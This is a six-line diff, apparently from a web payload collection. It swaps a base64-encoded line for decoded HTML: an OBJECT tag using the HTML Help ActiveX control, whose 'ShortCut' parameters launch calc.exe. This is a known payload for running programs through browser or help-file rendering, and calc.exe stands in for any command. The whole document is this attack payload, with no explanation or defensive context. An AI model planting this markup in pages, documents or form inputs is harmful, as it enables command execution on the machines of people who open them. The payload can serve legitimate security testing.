@@ -1,1 +1,6 @@
-Jmx0O09CSkVDVCBpZD14IGNsYXNzaWQ9ImNsc2lkOmFkYjg4MGE2LWQ4ZmYtMTFjZi05Mzc3LTAwYWEwMDNiN2ExMSIgd2lkdGg9MWhlaWdodD0xJmd0Ow0KJmx0O1BBUkFNIG5hbWU9IkNvbW1hbmQidmFsdWU9IlNob3J0Q3V0IiZndDsNCiZsdDtQQVJBTSBuYW1lPSJCdXR0b24idmFsdWU9IkJpdG1hcDo6c2hvcnRjdXQiJmd0Ow0KJmx0O1BBUkFNIG5hbWU9Ikl0ZW0xInZhbHVlPSYjMzk7LGNhbGMuZXhlJiMzOTsmZ3Q7DQombHQ7UEFSQU0gbmFtZT0iSXRlbTIidmFsdWU9IjI3MywxLDEiJmd0Ow0KJmx0Oy9PQkpFQ1QmZ3Q7
+<OBJECT id=submit classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1height=1>
+<PARAM name="Command"value="ShortCut">
+<PARAM name="Button"value="Bitmap::shortcut">
+<PARAM name="Item1"value=',calc.exe'>
+<PARAM name="Item2"value="273,1,1">
+</OBJECT>
